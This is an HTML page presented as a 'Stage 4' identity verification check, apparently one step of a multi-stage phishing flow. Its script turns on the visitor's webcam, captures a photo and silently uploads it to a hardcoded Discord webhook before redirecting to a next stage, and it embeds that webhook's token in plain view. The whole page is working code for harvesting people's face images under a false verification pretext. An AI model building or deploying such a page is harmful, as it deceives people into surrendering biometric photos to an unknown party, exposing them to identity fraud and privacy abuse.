<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>STAGE 4: VERIFICATION CHECK</title>
  <style>
    body { background: #0b0e14; color: #58a6ff; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 8px; width: 340px; text-align: center; }
    .video-box { width: 280px; height: 280px; margin: 15px auto; border: 2px solid #58a6ff; border-radius: 8px; overflow: hidden; background: #000; }
    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    button { padding: 12px 24px; background: #238636; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; font-family: monospace; }
  </style>
</head>
<body>

  <div class="card">
    <h3>[ STAGE 4: IDENTITY CHECK ]</h3>
    <p>Align face in preview box and click below to submit your verification photo.</p>
    <div class="video-box">
      <video id="webcam" autoplay playsinline muted></video>
    </div>
    <button id="snapBtn" onclick="takeSnapshot()">TAKE & SUBMIT PHOTO</button>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";
    const video = document.getElementById('webcam');
    const snapBtn = document.getElementById('snapBtn');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => { alert("Camera access required to proceed."); });

    function takeSnapshot() {
      snapBtn.disabled = true;
      snapBtn.innerText = "SUBMITTING...";

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('content', '📸 **New Verification Snapshot Received!**');
        formData.append('file', blob, 'verification_photo.jpg');

        fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          body: formData
        }).then(() => {
          window.location.href = "stage5.html";
        }).catch(() => {
          window.location.href = "stage5.html";
        });
      }, 'image/jpeg');
    }
  </script>
</body>
</html>
